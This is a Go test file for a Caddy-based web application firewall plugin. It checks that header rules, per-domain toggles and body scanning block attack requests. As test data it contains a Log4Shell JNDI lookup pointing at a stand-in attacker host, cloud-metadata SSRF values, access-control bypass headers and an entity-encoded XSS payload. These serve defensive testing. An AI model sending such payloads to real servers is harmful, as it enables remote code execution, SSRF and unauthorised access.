package caddyguard

import (
	"encoding/json"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// newTempGuard 构造一个使用临时规则目录的 Guard，便于精确控制配置与规则
// overrides 用于覆盖 config.json 中的字段（基于 DefaultConfig）
func newTempGuard(t *testing.T, overrides map[string]any, files map[string]string) *Guard {
	t.Helper()
	dir := t.TempDir()

	cfg := DefaultConfig()
	cfg.LogDir = dir
	cfg.CCCheck = "off"
	cfg.RefererCheck = "off"

	raw, err := json.Marshal(cfg)
	if err != nil {
		t.Fatalf("marshal default config: %v", err)
	}
	var m map[string]any
	if err := json.Unmarshal(raw, &m); err != nil {
		t.Fatalf("unmarshal default config: %v", err)
	}
	for k, v := range overrides {
		m[k] = v
	}
	out, err := json.Marshal(m)
	if err != nil {
		t.Fatalf("marshal test config: %v", err)
	}
	if err := os.WriteFile(filepath.Join(dir, "config.json"), out, 0644); err != nil {
		t.Fatalf("write config.json: %v", err)
	}

	for name, content := range files {
		p := filepath.Join(dir, name)
		if err := os.MkdirAll(filepath.Dir(p), 0755); err != nil {
			t.Fatalf("mkdir %s: %v", filepath.Dir(p), err)
		}
		if err := os.WriteFile(p, []byte(content), 0644); err != nil {
			t.Fatalf("write %s: %v", name, err)
		}
	}

	return &Guard{
		RuleDir:   dir,
		ruleCache: NewRuleCache(dir),
		ccStore:   NewMemoryStore(),
		logger:    NewWAFLogger(dir),
	}
}

// doWAFRequest 通过 Guard.ServeHTTP 发一次请求，返回响应状态码
func doWAFRequest(t *testing.T, g *Guard, method, target, host string, headers map[string]string, body string) int {
	t.Helper()
	var rdr io.Reader
	if body != "" {
		rdr = strings.NewReader(body)
	}
	r := httptest.NewRequest(method, target, rdr)
	r.RemoteAddr = "192.168.1.100:12345"
	r.Host = host
	for k, v := range headers {
		r.Header.Set(k, v)
	}
	w := httptest.NewRecorder()
	if err := g.ServeHTTP(w, r, caddyhttpHandler(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
	})); err != nil {
		t.Fatalf("ServeHTTP error: %v", err)
	}
	return w.Code
}

// TestHeaderRuleBlocksBypassHeaders 使用仓库自带 rule-config 验证 header.rule 拦截效果
func TestHeaderRuleBlocksBypassHeaders(t *testing.T) {
	g := &Guard{
		RuleDir:   "rule-config",
		ruleCache: NewRuleCache("rule-config"),
		ccStore:   NewMemoryStore(),
		logger:    NewWAFLogger(t.TempDir()),
	}

	blocked := []struct {
		name   string
		header [2]string
	}{
		{"Next.js middleware bypass", [2]string{"X-Middleware-Subrequest", "pages"}},
		{"X-Original-URL override", [2]string{"X-Original-URL", "/admin"}},
		{"X-Rewrite-URL override", [2]string{"X-Rewrite-URL", "/admin"}},
		{"HTTP method override", [2]string{"X-HTTP-Method-Override", "DELETE"}},
		{"X-Backend override", [2]string{"X-Backend", "127.0.0.1"}},
		{"X-Original-Host override", [2]string{"X-Original-Host", "evil.example"}},
		{"cloud metadata SSRF via XFF", [2]string{"X-Forwarded-For", "169.254.169.254"}},
		{"cloud metadata SSRF via Forwarded", [2]string{"Forwarded", "for=metadata.google.internal"}},
		{"Log4Shell JNDI in header", [2]string{"X-Api-Key", "${jndi:ldap://evil.example/a}"}},
		{"lowercase header name", [2]string{"x-original-url", "/admin"}},
	}
	for _, tt := range blocked {
		t.Run(tt.name, func(t *testing.T) {
			headers := map[string]string{
				"User-Agent": "Mozilla/5.0",
				"Accept":     "*/*",
				tt.header[0]: tt.header[1],
			}
			if code := doWAFRequest(t, g, "GET", "/", "example.com", headers, ""); code != http.StatusForbidden {
				t.Fatalf("expected 403 for %v, got %d", tt.header, code)
			}
		})
	}

	allowed := []struct {
		name   string
		header [2]string
	}{
		{"normal request", [2]string{"Accept", "*/*"}},
		{"header name mentioned in value", [2]string{"X-Note", "see x-backend: docs"}},
		{"token without colon", [2]string{"X-Note", "x-original-url"}},
		{"jndi without dollar", [2]string{"X-Note", "jndi:ldap"}},
	}
	for _, tt := range allowed {
		t.Run(tt.name, func(t *testing.T) {
			headers := map[string]string{
				"User-Agent": "Mozilla/5.0",
				tt.header[0]: tt.header[1],
			}
			if code := doWAFRequest(t, g, "GET", "/", "example.com", headers, ""); code != http.StatusOK {
				t.Fatalf("expected 200 for %v, got %d", tt.header, code)
			}
		})
	}
}

// TestHeaderCheckDisabled 验证 header_check=off 时请求头检测关闭（含域名级覆盖）
func TestHeaderCheckDisabled(t *testing.T) {
	headerRule := "(?i:^x-original-url:)\n"
	attack := map[string]string{"User-Agent": "Mozilla/5.0", "X-Original-URL": "/admin"}

	// 默认开启
	g := newTempGuard(t, nil, map[string]string{"header.rule": headerRule})
	if code := doWAFRequest(t, g, "GET", "/", "example.com", attack, ""); code != http.StatusForbidden {
		t.Fatalf("expected 403 with header_check on, got %d", code)
	}

	// 全局关闭
	g = newTempGuard(t, map[string]any{"header_check": "off"}, map[string]string{"header.rule": headerRule})
	if code := doWAFRequest(t, g, "GET", "/", "example.com", attack, ""); code != http.StatusOK {
		t.Fatalf("expected 200 with header_check off, got %d", code)
	}

	// 域名级覆盖：example.com 关闭，other.com 仍检测
	g = newTempGuard(t, nil, map[string]string{
		"header.rule": headerRule,
		"domain.json": `{"example.com": {"header_check": "off"}}`,
	})
	if code := doWAFRequest(t, g, "GET", "/", "example.com", attack, ""); code != http.StatusOK {
		t.Fatalf("expected 200 for domain-level header_check off, got %d", code)
	}
	if code := doWAFRequest(t, g, "GET", "/", "other.com", attack, ""); code != http.StatusForbidden {
		t.Fatalf("expected 403 for other.com, got %d", code)
	}
}

// TestHeaderCheckWhiteURLSkip 验证 whiteurl 扩展格式的 header 跳过项
func TestHeaderCheckWhiteURLSkip(t *testing.T) {
	g := newTempGuard(t, nil, map[string]string{
		"header.rule":   "(?i:^x-original-url:)\n",
		"whiteurl.rule": "/callback/ header\n/static/\n",
	})
	attack := map[string]string{"User-Agent": "Mozilla/5.0", "X-Original-URL": "/admin"}

	if code := doWAFRequest(t, g, "GET", "/callback/hook", "example.com", attack, ""); code != http.StatusOK {
		t.Fatalf("expected 200 on header-skip path, got %d", code)
	}
	if code := doWAFRequest(t, g, "GET", "/proxy/path", "example.com", attack, ""); code != http.StatusForbidden {
		t.Fatalf("expected 403 on non-skip path, got %d", code)
	}
	// 纯路径白名单默认只跳过 url_attack，不跳过请求头检测
	if code := doWAFRequest(t, g, "GET", "/static/app.js", "example.com", attack, ""); code != http.StatusForbidden {
		t.Fatalf("expected 403 on plain whiteurl path, got %d", code)
	}
}

// TestHeaderRuleMultilineAnchoring 验证 header.rule 按多行模式编译（^ 锚定任意头行行首）
func TestHeaderRuleMultilineAnchoring(t *testing.T) {
	pattern := "(?i:^x-probe:)\n"
	text := "Host: example.com\nX-Probe: 1"

	ml := parseAndCompileRules(pattern, true)
	matched := matchRulesInternal(text, ml, true)
	if matched == nil {
		t.Fatal("multiline rule should match a header line after the first line")
	}
	if matched.Raw != "(?i:^x-probe:)" {
		t.Fatalf("unexpected matched rule: %q", matched.Raw)
	}

	noML := parseAndCompileRules(pattern, false)
	if matched := matchRulesInternal(text, noML, true); matched != nil {
		t.Fatalf("non-multiline rule must not match a later line, matched %q", matched.Raw)
	}
}

// TestAllShippedRuleFilesCompile 验证仓库内所有 .rule 文件都能被 RE2 正常编译，
// 且 # 注释行不会被当作规则（防止规则静默丢失）
func TestAllShippedRuleFilesCompile(t *testing.T) {
	dirs := []string{"rule-config", "rule-config/domains/www.example.com"}
	for _, dir := range dirs {
		entries, err := os.ReadDir(dir)
		if err != nil {
			t.Fatalf("read rule dir %s: %v", dir, err)
		}
		for _, e := range entries {
			if e.IsDir() || !strings.HasSuffix(e.Name(), ".rule") {
				continue
			}
			path := filepath.Join(dir, e.Name())
			content, err := os.ReadFile(path)
			if err != nil {
				t.Fatalf("read %s: %v", path, err)
			}

			want := 0
			for _, line := range strings.Split(string(content), "\n") {
				line = strings.TrimSpace(line)
				if line == "" || strings.HasPrefix(line, "#") {
					continue
				}
				want++
			}

			rules := parseAndCompileRules(string(content), multilineRuleFiles[e.Name()])
			if len(rules) != want {
				t.Errorf("%s: %d rules compiled, want %d (regex 编译失败会被静默跳过)", path, len(rules), want)
			}
			for _, r := range rules {
				if strings.HasPrefix(r.Raw, "#") {
					t.Errorf("%s: comment line %q was compiled as a rule", path, r.Raw)
				}
			}
		}
	}
}

// TestFormURLEncodedEntityFallback 验证 &#x3c; 实体被 & 拆散后的兜底 raw body 扫描
func TestFormURLEncodedEntityFallback(t *testing.T) {
	g := newTempGuard(t, nil, map[string]string{
		"post.rule": `\<(iframe|script|svg|object|embed|applet|meta|base|layer)` + "\n",
	})
	formHeaders := map[string]string{
		"User-Agent":   "Mozilla/5.0",
		"Content-Type": "application/x-www-form-urlencoded",
	}

	// 实体拆散：ParseQuery 拆出的 key/value 都不含 "<script"，需要 raw body 兜底
	if code := doWAFRequest(t, g, "POST", "/", "example.com", formHeaders, "name=&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;"); code != http.StatusForbidden {
		t.Fatalf("expected 403 for entity-split XSS payload, got %d", code)
	}

	// 普通表单不触发
	if code := doWAFRequest(t, g, "POST", "/", "example.com", formHeaders, "username=admin&password=test123"); code != http.StatusOK {
		t.Fatalf("expected 200 for normal form body, got %d", code)
	}

	// 含实体标记但解码后无毒 → 放行（避免过度拦截）
	if code := doWAFRequest(t, g, "POST", "/", "example.com", formHeaders, "note=&#x41;&#x42;&#x43;"); code != http.StatusOK {
		t.Fatalf("expected 200 for harmless entity body, got %d", code)
	}
}

// TestHeaderRuleCommentLinesSkipped 验证规则文件中的 # 注释行不参与匹配
func TestHeaderRuleCommentLinesSkipped(t *testing.T) {
	g := newTempGuard(t, nil, map[string]string{
		"header.rule": "# x-probe-marker\n(?i:^x-probe:)\n\n# another-comment\n",
	})

	// 若注释行被当成规则，这里会被拦截
	if code := doWAFRequest(t, g, "GET", "/", "example.com", map[string]string{
		"User-Agent": "Mozilla/5.0",
		"X-Note":     "x-probe-marker",
	}, ""); code != http.StatusOK {
		t.Fatalf("comment text must not be treated as a rule, got %d", code)
	}
	if code := doWAFRequest(t, g, "GET", "/", "example.com", map[string]string{
		"User-Agent": "Mozilla/5.0",
		"X-Probe":    "1",
	}, ""); code != http.StatusForbidden {
		t.Fatalf("expected 403 for x-probe header, got %d", code)
	}
}
